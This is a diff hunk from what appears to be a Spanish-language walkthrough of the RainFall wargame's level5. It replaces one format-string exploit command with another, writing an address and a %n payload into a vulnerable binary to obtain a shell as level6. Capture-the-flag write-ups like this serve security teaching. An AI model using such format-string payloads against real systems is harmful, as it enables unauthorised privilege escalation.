@@ -156,7 +156,7 @@ level5@RainFall:~$
 
 ### **Ejecución:**
 ```bash
-level5@RainFall:~$ (printf "\x30\x98\x04\x08"; printf "%%134513824%%4\$n"; cat) | ./level5
+level5@RainFall:~$ (python -c "print '\x38\x98\x04\x08' + '%134513824d' + '%4\$n'"; cat) | ./level5
 whoami
 level6
 pwd
